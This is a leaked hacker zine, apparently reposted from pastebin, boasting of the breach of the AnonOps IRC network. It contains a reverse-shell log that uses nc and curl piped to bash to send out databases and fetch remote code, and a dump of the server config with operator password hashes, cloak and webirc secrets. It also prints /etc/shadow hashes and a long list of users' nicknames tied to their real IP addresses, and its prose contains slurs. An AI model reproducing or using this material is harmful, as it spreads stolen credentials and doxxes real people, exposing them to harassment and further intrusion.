@@ -1,0 +1,833 @@
+HACK EL PLANETA | AnonOps From: h () ck el planeta
+
+    From http://pastebin.com/mDJrP1Nk
+
+
+888    888        d8888  .d8888b.  888    d8P  
+888    888       d88888 d88P  Y88b 888   d8P  
+888    888      d88P888 888    888 888  d8P    
+8888888888     d88P 888 888        888d88K    
+888    888    d88P  888 888        8888888b    
+888    888   d88P   888 888    888 888  Y88b  
+888    888  d8888888888 Y88b  d88P 888   Y88b  
+888    888 d88P     888  "Y8888P"  888    Y88b
+                             _____          
+8888888888 888           ,-:` \;',`'-
+888        888         .'-;_,;  ':-;_,'.
+888        888        /;   '/    ,  _`.-\
+8888888    888       | '`. (`     /` ` \`|
+888        888       |:.  `\`-.   \_   / |
+888        888       |     (   `,  .`\ ;'|
+888        888        \     | .'     `-'/
+8888888888 88888888    `.   ;/        .'
+                         `'-._____.-'`
+                                     
+8888888b.  888             d8888 888b    888 8888888888 88888888888        d8888
+888   Y88b 888            d88888 8888b   888 888            888           d88888
+888    888 888           d88P888 88888b  888 888            888          d88P888
+888   d88P 888          d88P 888 888Y88b 888 8888888        888         d88P 888
+8888888P"  888         d88P  888 888 Y88b888 888            888        d88P  888
+888        888        d88P   888 888  Y88888 888            888       d88P   888
+888        888       d8888888888 888   Y8888 888            888      d8888888888
+888        88888888 d88P     888 888    Y888 8888888888     888     d88P     888
+                <shitstorm> lol who the fuck is carlos
+                              CARLOS1337
+                               PRESENTE
+                          LOL ANONOPS MUERTO
+                           CERO DIA EDICION
+            
+ 
+&#9484;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;
+ &#9474; :: Table of Contents :: &#9474;
+ 
+&#9500;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9508;
+ &#9474; 0x01 ~ Prefac3          &#9474;
+ 
+&#9500;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9508;
+ &#9474; 0x02 ~ s3rv1c3s pwn     &#9474;
+ 
+&#9500;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9508;
+ &#9474; 0x03 ~ iRCd pwn         &#9474;
+ 
+&#9500;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9508;
+ &#9474; 0x04 ~ b0x pwn          &#9474;
+ 
+&#9500;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9508;
+ &#9474; 0x05 ~ 1ps              &#9474;
+ 
+&#9500;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9508;
+ &#9474; 0x06 ~ l0l sh1t         &#9474;
+ 
+&#9500;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9508;
+ &#9474; 0x07 ~ FiL3z            &#9474;
+ 
+&#9500;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9508;
+ &#9474; 0x08 ~ ex1t             &#9474;
+ 
+&#9492;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9496;
+
+                            :: 0x01 - Prefac3 ::
+            
+    Over the course of the following months, it has become very clear to us that
+AnonOps no longer stands for the values of open speech, freedom of opinion and
+has instead transformed itself into a network rampent with trolls, abusive
+channel operators, and a generally unwelcoming place for those whom wish to
+communicate and gather to fight the powers of corruption, and those whom wish
+to censor our open internet. Various attempts have been made in the past to
+course correct AnonOps, but the totalitarian IRC operator regime has remained
+intact.
+    The AnonOps network prides itself in being "secure", however, such is not
+the case. Rather, they employ incompetent and highly unprofessional channel and 
+IRC operators, allowing their personal grudges to interfere with the operation
+of a secure network for Anonymous. Newcomers to the network are welcomed by a
+spirit of condescention and arrogance, as any legitimate question or concern is
+slowly drowned out by the laughter of the senior members of the chatroom.
+Channel operators rather than discourage such behavior, applaud it, joining in,
+and using their powers to kick, ban, or SAJOIN newcomers to #kill. Any attempt
+to speak out against the way the network is ran is met with kick, ban, or zline.
+A decentralized organization such as Anonymous cannot thrive on a network ran by
+such people as Power2All, Wolfy, Owen and Shitstorm. Anonymous transcends beyond
+one IRC network, or one social medium. Spread. Be aware. Educate. Anonymous is
+an idea; ideas are bulletproof. 
+    Anonymous cannot be owned or controlled by a small group of faggot
+totaltarian operators. Thus we have decided to lombotomize the cancer that is
+AnonOps from the internet. AnonOps no longer stands with Anonymous, but rather
+against us as an agent of censorship, unlulzy pseudo-activism and immense
+faggotry, and thus must be eliminated. 
+    AnonOps has proven itself insecure and fault prone in the past. We are here
+to illustrate these points again. AnonOps is NOT Anonymous, and throughtheir
+actions, they have proven themselves against our ideals. Welcome to thecourt of
+the internet, AnonOps. You shall be persecuted for your crimes against the
+freedom of chats, your utter and repeated failure as an IRC network, your aid to
+the spread of namefagging, and your gross negligence in securing the identities
+of those whom chat and remain Anonymous on your network. 
+    AnonOps has shown time and time again it is too large of a target, and very
+well capable of corrupting the ideals which fuels the fight in every Anon.
+As long as AnonOps stay online, they will continue to adulterate our cause,
+bastardizing ideals of Anonymous, and running a network where the only lulz to
+be had are that of the failures whom chat there and run the network. Such
+activity cannot continue. 
+
+Let's drop the formalities now, and get down to business!
+
+                        :: 0x02 - s3rv1c3s pwn ::
+                 &#161;HOLA! &#161;CARLOS1337 AQUI CON UN NUEVO ZINE!
+        ~~~ JAJA ANONOPS ESTOY MUERTO: &#161;AY CARAMBA! &#161;UNA CERO DIA! ~~~
+
+After probing AnonOps for quite a while, we figured out that they were using
+a vulnerable version of Anope IRC Services. With a bit of luck, and an in house
+zero day we were able to get ourselves a reverse shell.
+
+ connect to [REDACTED] from 46.182.105.86 38604
+[anonops () ns1 ~]$ id
+uid=502(anonops) gid=502(anonops) groups=502(anonops)
+
+# Let's go ahead and snag ourselves some juicy files... 
+[anonops () ns1 ~]$ cd ~/inspircd/run/conf
+[anonops () ns1 conf]$ nc htp 443 < inspircd.conf
+[anonops () ns1 conf]$ cd ~/services
+[anonops () ns1 services]$ nc htp 443 < nick.db
+[anonops () ns1 services]$ nc htp 443 < chan.db
+[anonops () ns1 services]$ nc htp 443 < oper.db
+[anonops () ns1 services]$ nc htp 443 < os_info.db
+
+# And then let's go ahead and hook services.
+[anonops () ns1 services]$ curl http://secret.hep.cc/lol.sh | bash >/dev/null 2>&1
+[anonops () ns1 services]$ killall services; ./services; exit
+
+
+                         :: 0x02 - iRCd pwn ::
+                              &#161;Dios Mios!
+
+<admin name="AnonOps" nick="AnonOps" email="AnonOpsNetwork () gmail com">
+
+<power hash="sha256"
+    diepass="62b0ddb2bda9dd3cd239f6ae21c88ef13d2e70d27e0f79fbf88be0f1575ed8fb"
+    restartpass="ca985667598484ddf516e3b2f445491b4c31e82963422dd07d305bcc4d24ff65">
+
+<connect name="localhost" allow="127.0.0.0/8" timeout="90" pingfreq="120"
+    hardsendq="786432" softsendq="8192" recvq="8192" threshold="10"
+    commandrate="1000" fakelag="on" globalmax="1000" useident="no" limit="5000"
+    modes="+xiw">
+    
+<connect name="vpn" allow="46.236.2.47" timeout="40" pingfreq="120"
+    hardsendq="786432" softsendq="8192" recvq="8192" threshold="10"
+    commandrate="1000" fakelag="on" localmax="10" globalmax="10" useident="no"
+    modes="+xiw">
+
+<connect name="mibbit1" allow="64.62.228.82" timeout="40" pingfreq="120"
+    hardsendq="131074" recvq="4096" threshold="5" fakelag="on" localmax="5000"
+    globalmax="5000" useident="no" modes="+xwi">
+<connect name="mibbit2" allow="207.192.75.252" timeout="40" pingfreq="120"
+    hardsendq="131074" recvq="4096" threshold="5" fakelag="on" localmax="5000"
+    globalmax="5000" useident="no" modes="+wxi">
+<connect name="mibbit3" allow="78.129.202.38" timeout="40" pingfreq="120"
+    hardsendq="131074" recvq="4096" threshold="5" fakelag="on" localmax="5000"
+    globalmax="5000" useident="no" modes="+wxi">
+<connect name="mibbit4" allow="109.169.29.95" timeout="40" pingfreq="120"
+hardsendq="131074" recvq="4096" threshold="5" fakelag="on" localmax="5000"
+    globalmax="5000" useident="no" modes="+wxi">
+
+<connect name="main" allow="*" timeout="10" pingfreq="120" hardsendq="786432"
+    softsendq="8192" recvq="8192" threshold="10" commandrate="1000" fakelag="on"
+    localmax="2" globalmax="3" useident="no" limit="5000" modes="+xiw">
+    
+<cidr ipv4clone="32" ipv6clone="128">
+<channels users="50" opers="100">
+<banlist chan="*" limit="128">
+<options prefixquit="Quit: " suffixquit="" prefixpart="" suffixpart=""
+    fixedquit="" fixedpart="" syntaxhints="no" cyclehosts="no"
+    cyclehostsfromuser="no" ircumsgprefix="no" announcets="no"
+    allowmismatched="no" defaultbind="auto" hostintopic="no" pingwarning="15"
+    serverpingfreq="300" defaultmodes="nt" exemptchanops="NcBS"
+    invitebypassmodes="no">
+<performance netbuffersize="10240" maxwho="20" somaxconn="128" softlimit="1024"
+    quietbursts="yes" nouserdns="no">
+<security announceinvites="dynamic" hideulines="yes" flatlinks="yes"
+    hidewhois="AnonOps" hidebans="yes" hidekills="Killer" hidesplits="yes"
+    maxtargets="20" customversion="AnonOpsIRC" operspywhois="yes"
+    restrictbannedusers="yes" genericoper="yes" userstats="">
+<limits maxnick="31" maxchan="31" maxmodes="20" maxident="11" maxquit="100"
+    maxtopic="307" maxkick="150" maxgecos="30" maxaway="30">
+<whowas groupsize="3" maxgroups="5000" maxkeep="3d">
+<insane hostmasks="yes" ipmasks="yes" nickmasks="yes" trigger="75">
+
+<badnick nick="ChanServ" reason="Reserved For Services">
+<badnick nick="NickServ" reason="Reserved For Services">
+<badnick nick="OperServ" reason="Reserved For Services">
+<badnick nick="MemoServ" reason="Reserved For Services">
+<badnick nick="BotServ" reason="Reserved For Services">
+<badnick nick="vHostServ" reason="Reserved For Services">
+<badhost host="IRCLOIC () *" reason="wrong server">
+
+<uline server="services.anonops.in" silent="yes">
+<uline server="defender.anonops.in" silent="yes">
+
+# Oper Classes
+<class name="Root"
+    commands="DIE RESTART RSQUIT JUMPSERVER LOCKSERV UNLOCKSERV SQUIT
+    GRELOADMODULE CLEARCACHE">
+<class name="Shutdown" commands="REHASH LOADMODULE UNLOADMODULE RELOAD
+    GLOADMODULE GUNLOADMODULE SQUIT"
+    privs="users/auspex channels/auspex servers/auspex users/mass-message
+    channels/high-join-limit channels/set-permanent users/flood/no-throttle
+    users/flood/increased-buffers" usermodes="*" chanmodes="*">
+<class name="ServerLink" commands="CONNECT RCONNECT MKPASSWD ALLTIME SWHOIS
+    CLOSE TAXONOMY" usermodes="*" chanmodes="*" privs="servers/auspex">
+<class name="BanControl" commands="KILL GLINE KLINE ZLINE QLINE ELINE TLINE
+    RLINE CHECK NICKLOCK NICKUNLOCK SHUN CLONES" privs="channels/auspex
+    channels/high-join-limit" usermodes="*" chanmodes="*">
+<class name="OperChat" commands="WALLOPS GLOBOPS SETIDLE" usermodes="*"
+    chanmodes="*" privs="users/mass-message">
+<class name="HostCloak" commands="SETHOST SETIDENT SETNAME CHGHOST CHGIDENT
+    CHECK CHGNAME" usermodes="*" chanmodes="*">
+<class name="OperUnlag" privs="users/flood/no-throttle
+    users/flood/increased-buffers">
+<class name="ServAdmin" commands="SAMODE SAJOIN SAPART SANICK SAQUIT SATOPIC
+    OJOIN FILTER CBAN">
+
+# Oper Types
+<type name="RootAdmin" classes="Root Shutdown ServerLink BanControl OperChat
+    HostCloak OperUnlag ServAdmin" vhost="netadmin.anonops.li"
+    override="INVITE KEY LIMIT KICK MODEOP MODEDEOP MODEVOICE MODEDEVOICE
+    MODEHALFOP MODEDEHALFOP OTHERMODE TOPIC BANWALK">
+<type name="NetAdmin" classes="OperChat BanControl HostCloak Shutdown
+    ServerLink OperUnlag ServAdmin" vhost="netadmin.anonops.li"
+    override="INVITE KEY LIMIT KICK MODEOP MODEDEOP MODEVOICE MODEDEVOICE
+    MODEHALFOP MODEDEHALFOP OTHERMODE TOPIC">
+<type name="GlobalOp" classes="OperChat HostCloak BanControl OperUnlag ServerLink"
+    vhost="ircop.anonops.in" override="KICK MODEOP MODEDEOP MODEVOICE
+    MODEDEVOICE MODEHALFOP MODEDEHALFOP">
+<type name="Helper" classes="HostCloak" vhost="helper.anonops.in">
+<type name="ServicesAdmin" classes="OperChat HostCloak OperUnlag BanControl
+    ServerLink Shutdown" vhost="servadmin.anonops.li"
+    override="INVITE KEY LIMIT KICK MODEOP MODEDEOP MODEVOICE MODEDEVOICE
+    MODEHALFOP MODEDEHALFOP OTHERMODE TOPIC">
+
+# Oper List
+<oper name="power2all" hash="sha256"
+    password="e6275286066acd1939ee617fd8481903b5de5b3573d00835481db7024f8cc488"
+    host="* () *" vhost="staff.anonops.li" type="RootAdmin">
+<oper name="Cody" hash="sha256"
+    password="1698c6b760f79d808b27dc8d2605acafbbf53cdf78d3603a0883b8df2f483b9f"
+    host="* () *" vhost="staff.anonops.li" type="NetAdmin">
+<oper name="pi" hash="sha256"
+    password="c12c6c10bfe35d2facfede647fb6651ea0074660d17ee3af3bd7831d087d44ce"
+    host="* () *" vhost="anonops.staff" type="RootAdmin">
+<oper name="p0ke" hash="sha256"
+    password="a214007b665299c451106a9ea16687ec845d9131646de9099521d34065d98ac6"
+    host="* () *" vhost="staff.anonops.li" type="NetAdmin">
+<oper name="jaychow" hash="sha256"
+    password="2037df642493897250048bb739d3237c11aabb48e4e00dfa9f75dc163bda1742"
+    host="* () *" vhost="staff.anonops.li" type="NetAdmin">
+<oper name="shitstorm" hash="sha256"
+    password="1eba91646d70e6634e3014a3167c6e0efa3a2809472645711d8306b787322821"
+    host="* () *" vhost="staff.anonops.li" type="RootAdmin">
+#<oper name="Isis" hash="sha256"
+#   password="61f317d24a98796f28c387c0db5cebe475cd5dcd67963e68fafabc22d79636b7"
+#   host="* () *" vhost="staff.anonops.li" type="NetAdmin">
+#<oper name="Nerdo" hash="sha256"
+#   password="7bbc72b57333b8f4dbbab0d88847e2f25d6cd5926876b0fad07db2469151e046"
+#   host="* () *" vhost="staff.anonops.li" type="RootAdmin">
+<oper name="evilworks" hash="sha256"
+    password="8a6d07285f406fb3c894c30545ef9514cd3056b6316dd016e0365c43de7e6b7b"
+    host="* () *" vhost="staff.anonops.li" type="NetAdmin">
+<oper name="Jupiler" hash="sha256"
+    password="96803102354be6a01acfd47e62eb0eace11fa6aff44e20fc94afe9244f4038a3"
+    host="* () *" vhost="staff.anonops.li" type="NetAdmin">
+#<oper name="sharpie" hash="sha256"
+#   password="24dd9c6aab6e116fbb62f9aa5cba78ccd0b9852c929064e5ae07cebd29a20db7"
+#   host="* () *" vhost="staff.anonops.li" type="NetAdmin">
+<oper name="daboogieman" hash="sha256"
+    password="0e3b8fa38cfae600196897531e5b1b96059c6041b9ad68eec1ba0ed91a1d6027"
+    host="* () *" vhost="staff.anonops.li" type="NetAdmin">
+<oper name="pie" hash="sha256"
+    password="5bc4d814c4ed162f2cea2a40ffb156f2cac198ddf24316a2de6e3614cc892461"
+    host="* () *" vhost="staff.anonops.li" type="NetAdmin">
+
+# Default Modules Configs
+<module name="m_md5.so">
+<module name="m_sha256.so">
+<module name="m_ripemd160.so">
+
+<module name="m_alias.so">
+<alias text="NICKSERV" replace="PRIVMSG NickServ :$2-" requires="NickServ"
+    uline="yes">
+<alias text="CHANSERV" replace="PRIVMSG ChanServ :$2-" requires="ChanServ"
+    uline="yes">
+<alias text="OPERSERV" replace="PRIVMSG OperServ :$2-" requires="OperServ"
+    uline="yes" operonly="yes">
+<alias text="BOTSERV" replace="PRIVMSG BotServ :$2-" requires="BotServ"
+    uline="yes">
+<alias text="HOSTSERV" replace="PRIVMSG HostServ :$2-" requires="HostServ"
+    uline="yes">
+<alias text="MEMOSERV" replace="PRIVMSG MemoServ :$2-" requires="MemoServ"
+    uline="yes">
+<alias text="NS" replace="PRIVMSG NickServ :$2-" requires="NickServ" uline="yes">
+<alias text="CS" replace="PRIVMSG ChanServ :$2-" requires="ChanServ" uline="yes">
+<alias text="OS" replace="PRIVMSG OperServ :$2-" requires="OperServ" uline="yes"
+    operonly="yes">
+<alias text="BS" replace="PRIVMSG BotServ :$2-" requires="BotServ" uline="yes">
+<alias text="HS" replace="PRIVMSG HostServ :$2-" requires="HostServ" uline="yes">
+<alias text="MS" replace="PRIVMSG MemoServ :$2-" requires="MemoServ" uline="yes">
+<alias text="IDENTIFY" replace="PRIVMSG NickServ :IDENTIFY $2" requires="NickServ"
+    uline="yes">
+
+<module name="m_allowinvite.so">
+<module name="m_alltime.so">
+<module name="m_auditorium.so">
+<auditorium opvisible="no" opcansee="yes" opercansee="yes">
+<module name="m_blockcolor.so">
+<module name="m_botmode.so">
+<module name="m_callerid.so">
+<callerid maxaccepts="16" operoverride="yes" tracknick="no" cooldown="120">
+<module name="m_chancreate.so">
+<module name="m_chanprotect.so">
+<chanprotect noservices="no" qprefix="~" aprefix="&amp;" deprotectself="yes"
+    deprotectothers="yes">
+<module name="m_check.so">
+<module name="m_chghost.so">
+<module name="m_chgident.so">
+<module name="m_chgname.so">
+<module name="m_cloaking.so">
+<cloak mode="full" key="bubrafuKuWazunustFrUvacuvezawrU4rEgu" prefix="AN-">
+<module name="m_close.so">
+<module name="m_clones.so">
+<module name="m_conn_umodes.so">
+#<module name="m_connectban.so">
+#<connectban threshold="4" duration="10m" ipv4cidr="32" ipv6cidr="128">
+<module name="m_dccallow.so">
+<dccallow blockchat="yes" length="0" action="block">
+<banfile pattern="*" action="block">
+<module name="m_delayjoin.so">
+<module name="m_devoice.so">
+<module name="m_dnsbl.so">
+<dnsbl name="DroneBL" type="bitmask" domain="dnsbl.dronebl.org" action="ZLINE"
+    reason="DroneBL" duration="30d" bitmask="253">
+<dnsbl name="ProxyBL" type="bitmask" domain="dnsbl.proxybl.org" action="ZLINE"
+    reason="ProxyBL" duration="30d" bitmask="253">
+<dnsbl name="efnetRBL" type="bitmask" domain="rbl.efnet.org" action="ZLINE"
+    reason="EFnetRBL" duration="30d" bitmask="253">
+<module name="m_filter.so">
+<filteropts engine="pcre">
+<module name="m_globalload.so">
+<module name="m_globops.so">
+<module name="m_halfop.so">
+<module name="m_hidechans.so">
+<hidechans affectsopers="false">
+<module name="m_hideoper.so">
+<module name="m_inviteexception.so">
+<module name="m_joinflood.so">
+<module name="m_knock.so">
+<module name="m_lockserv.so">
+<module name="m_maphide.so">
+<module name="m_messageflood.so">
+<module name="m_muteban.so">
+<module name="m_conn_waitpong.so">
+<waitpong sendsnotice="yes" killonbadreply="no">
+<module name="m_nickflood.so">
+<module name="m_nicklock.so">
+<module name="m_nonotice.so">
+<module name="m_noctcp.so">
+<module name="m_nokicks.so">
+<module name="m_nonicks.so">
+
+#Oper modules
+<module name="m_operchans.so">
+<module name="m_ojoin.so">
+<ojoin prefix="" notice="no" op="no">
+<module name="m_operjoin.so">
+<operjoin channel="#opers" override="no">
+<module name="m_opermotd.so">
+<opermotd file="oper.motd" onoper="yes">
+<module name="m_override.so">
+<module name="m_password_hash.so">
+<module name="m_redirect.so">
+<module name="m_regex_glob.so">
+<module name="m_regex_posix.so">
+<module name="m_regex_pcre.so">
+<module name="m_regonlycreate.so">
+<module name="m_rline.so">
+<module name="m_sajoin.so">
+<module name="m_sakick.so">
+<module name="m_samode.so">
+<module name="m_sanick.so">
+<module name="m_sapart.so">
+<module name="m_satopic.so">
+<module name="m_securelist.so">
+<securehost exception="* () * searchirc org">
+<securehost exception="* () * netsplit de">
+<securehost exception="* () bot search mibbit com">
+<module name="m_sethost.so">
+<module name="m_setident.so">
+<module name="m_setname.so">
+<module name="m_seenicks.so">
+<module name="m_services_account.so">
+<module name="m_showwhois.so">
+<module name="m_shun.so">
+<shun enabledcommands="PING PONG QUIT PART" notifyuser="no" affectopers="no">
+<module name="m_spanningtree.so">
+<module name="m_sslmodes.so">
+<module name="m_ssl_gnutls.so">
+<module name="m_sslinfo.so">
+<module name="m_stripcolor.so">
+<module name="m_svshold.so">
+<module name="m_swhois.so">
+<module name="m_timedbans.so">
+<module name="m_tline.so">
+#<module name="m_xline_db.so">
+
+#Mibbit Blocks
+<module name="m_cgiirc.so">
+<cgihost type="webirc" password="MaF6uSTadeTUcre52wuqU84UQ4p2u4RA"
+    mask="64.62.228.82">
+<cgihost type="webirc" password="MaF6uSTadeTUcre52wuqU84UQ4p2u4RA"
+    mask="207.192.75.252"> 
+<cgihost type="webirc" password="MaF6uSTadeTUcre52wuqU84UQ4p2u4RA"
+    mask="78.129.202.38"> 
+<cgihost type="webirc" password="MaF6uSTadeTUcre52wuqU84UQ4p2u4RA"
+    mask="109.169.29.95"> 
+
+# P0ke's WebIRC
+<cgihost type="webirc" password="gQhsUKatbEMPruwFqjm" mask="127.0.0.1">
+
+
+                        :: 0x04 - b0x pwn ::
+
+[anonops () ns1 run]$ base64 utmp
+[anonops () ns1 etc]$ cat passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/etc/news:
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
+mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
+smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
+pcap:x:77:77::/var/arpwatch:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+avahi:x:70:70:Avahi daemon:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+avahi-autoipd:x:100:102:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+shitstorm:x:500:500::/home/shitstorm:/bin/bash
+anonops:x:501:501::/home/anonops:/bin/bash
+owen:x:502:502::/home/owen:/bin/bash
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+
+# IT GETS BETTER!
+[anonops () ns1 ~]$ cat /etc/shadow | grep '\$'
+root:$1$1wg7czx2$Twx4Tu6B/HhoPX4M/mCQF1:15292:0:99999:7:::
+shitstorm:$1$S9rg0Dwq$cSt2nrpUetbUe4VLwpLFC1:15292:0:99999:7:::
+anonops:$1$7BYkAp.7$cN4cPFCs3lXyLF19ifdUl/:15292:0:99999:7:::
+owen:$1$mtzJIgPo$Vl5cLKMafgP1/2Sv8iWGi/:15292:0:99999:7:::
+
+                    :: 0x05 ~ 1pS ::
+                   
+# These were posted on pastebin, but it didnt seem to get as much attention
+# as whoever posted it wanted it to get. All these are from a vulnerable
+# CGI:IRC which incompitence extra-ordinare Power2All assured everyone was safe.
+# What a fucking idiot.
+
+ANON555 97.104.251.171 cpe-97-104-251-171.cfl.res.rr.com
+ANON_Darkness 184.154.116.156 singlehop1.securitykiss.com
+ANONamy 86.189.5.32 host86-189-5-32.range86-189.btcentralplus.com
+AfDTags 76.85.186.139 CPE-76-85-186-139.neb.res.rr.com
+Anon23845 95.140.125.37 free-125-37.mediaworksit.net
+AnonFin 194.110.178.3 mail2.paf.fi
+AnonymousMe 69.130.46.124 h69-130-46-124.qrtzaz.dsl.dynamic.tds.net
+Azrae 74.232.155.229 adsl-074-232-155-229.sip.asm.bellsouth.net
+B2F 173.84.223.70
+Billy_Mays 65.183.151.13 saito.countshockula.com 109.235.51.184 tor-exit-node1.freedomservice.onion
+C0d3 76.0.7.183 mo-76-0-7-183.dhcp.embarqhsd.net
+CaineOfBorg 173.3.247.193 ool-ad03f7c1.dyn.optonline.net
+Caleb 94.75.255.118 hosted-by.leaseweb.com
+DJ-TAM 76.226.135.59 adsl-76-226-135-59.dsl.sfldmi.sbcglobal.net
+DubstepMagic 60.228.226.189 CPE-60-228-226-189.lns8.woo.bigpond.net.au
+Edave22 68.9.122.7 ip68-9-122-7.ri.ri.cox.net
+Epsilon 173.3.247.208 ool-ad03f7d0.dyn.optonline.net
+FedX 114.39.102.162 114-39-102-162.dynamic.hinet.net
+GlitchMC 174.124.43.61 174-124-43-61.dyn.centurytel.net
+HIv 95.140.125.37 free-125-37.mediaworksit.net
+Haze 12.18.245.219
+Indianrubuk 122.174.160.44 ABTS-TN-dynamic-044.160.174.122.airtelbroadband.in
+Inkk 108.18.106.240 pool-108-18-106-240.washdc.fios.verizon.net
+Jincux 184.91.149.18 18.149.91.184.cfl.res.rr.com
+Josss 78.228.41.61 sbg57-1-78-228-41-61.fbx.proxad.net
+LOLOL 0.0.7.209
+LTD 174.127.99.174 174.127.99.174.static.midphase.com
+Lumina 186.188.228.113
+M4C 201.96.104.241 customer-201-96-104-241.uninet-ide.com.mx
+Odinaga 129.72.141.219 uwyo-129-72-141-219.uwyo.edu
+Power2All 82.169.240.68 82-169-240-68.ip.telfort.nl
+RetSnom 138.199.70.143
+Ruffah_Ras 98.233.180.236 c-98-233-180-236.hsd1.md.comcast.net
+ShadowOp 75.18.160.149 adsl-75-18-160-149.dsl.pltn13.sbcglobal.net
+Smeryl 77.196.253.34 34.253.196.77.rev.sfr.net
+Smeyl 77.196.253.34 34.253.196.77.rev.sfr.net
+Swag 66.66.103.14 cpe-66-66-103-14.rochester.res.rr.com
+Thismanisadoctor 24.20.65.109 c-24-20-65-109.hsd1.or.comcast.net
+UNBANMEIMPORTANTSTUFF 24.167.16.4 cpe-24-167-16-4.rgv.res.rr.com
+Xerath 60.231.48.85 CPE-60-231-48-85.lns3.cha.bigpond.net.au
+anon123 187.146.160.236 dsl-187-146-160-236-dyn.prod-infinitum.com.mx
+anon4347 75.149.43.213 fabgraphics.com
+anonymama 75.157.157.14 d75-157-157-14.bchsia.telus.net
+bobbbbbb 93.182.187.4 anon-187-4.vpn.ipredator.se
+boho 173.23.64.22 173-23-64-22.client.mchsi.com
+br4incr4sh 81.56.209.237 server.abcdeflorent.com
+chippy1337LOL 93.182.130.66 anon-130-66.vpn.ipredator.se
+cokee 93.182.133.20 anon-133-20.vpn.ipredator.se
+cokeee 93.182.130.66 anon-130-66.vpn.ipredator.se
+comx6 190.99.231.241 dsl-emcali-190.99.231.241.emcali.net.co
+digger 0.0.0.2
+don 196.206.85.193 adsl196-193-85-206-196.adsl196-3.iam.net.ma
+dotprod 128.32.21.89 static-128-32-21-89.Law.Berkeley.EDU
+e 209.212.149.109 za.l.to
+eddie 166.250.1.233 233.sub-166-250-1.myvzw.com
+elena197 88.104.229.97 88-104-229-97.dynamic.dsl.as9105.com
+facePalmMe 128.32.21.89 static-128-32-21-89.Law.Berkeley.EDU
+fuckfox 128.32.21.89 static-128-32-21-89.Law.Berkeley.EDU
+g31g3r 137.238.147.205 s147n205.resnet.geneseo.edu
+gaston 173.174.139.89 cpe-173-174-139-89.satx.res.rr.com
+gawkcobbler 71.54.42.86 nc-71-54-42-86.dhcp.embarqhsd.net
+gezwitscher 175.41.162.169 ec2-175-41-162-169.ap-southeast-1.compute.amazonaws.com
+ghostcom 108.0.70.45 pool-108-0-70-45.lsanca.fios.verizon.net
+hacker 68.45.41.140 c-68-45-41-140.hsd1.nj.comcast.net
+heckl 68.68.108.159
+imti 173.48.90.41 pool-173-48-90-41.bstnma.fios.verizon.net
+k1tt3n 213.251.194.76
+k3ymaster 173.245.64.95
